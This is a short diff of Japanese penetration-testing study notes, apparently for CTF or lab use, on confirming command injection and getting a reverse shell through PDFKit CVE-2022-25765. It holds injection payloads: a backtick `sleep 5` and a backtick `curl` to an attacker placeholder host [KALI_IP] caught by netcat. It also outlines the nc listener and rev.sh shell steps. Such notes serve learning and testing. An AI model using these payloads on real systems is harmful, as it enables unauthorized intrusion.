@@ -166,14 +166,14 @@ searchsploit [ライブラリ名] [バージョン]
 | URL パラメータに `` `sleep 5` `` を含めて送信 | 応答が 5 秒遅延する | コマンドが実行されている（タイムベース確認） |
 | `` `curl http://[KALI_IP]:PORT/` `` を送信し nc で待機 | nc に GET リクエストが届く | OOB で RCE 確認 |
 
-### 手順（骨格）
+### 手順概要（ペイロード全文は CVE_Notes.md を参照）
 
 1. ライブラリ名・バージョンを特定（exiftool / レスポンスヘッダー）
 2. searchsploit → CVE 番号を確認 → `../../../05_Tools_Reference/CVE_Notes.md` でペイロードを確認
 3. nc リスナーと HTTP サーバー（シェルスクリプト配信用）を起動
 4. URL フォームにペイロードを送信してシェルを取得
 
-> 具体的なペイロード（PDFKit CVE-2022-25765 の curl コマンド・rev.sh テンプレート）→ `../../../05_Tools_Reference/CVE_Notes.md`
+> 具体的なペイロード・事前準備手順（PDFKit CVE-2022-25765 の curl コマンド・rev.sh テンプレート）→ `../../../05_Tools_Reference/CVE_Notes.md`
 
 ### 刺さらなかったとき
 - バックティックが無効 → `$(command)` ドル記法を試す
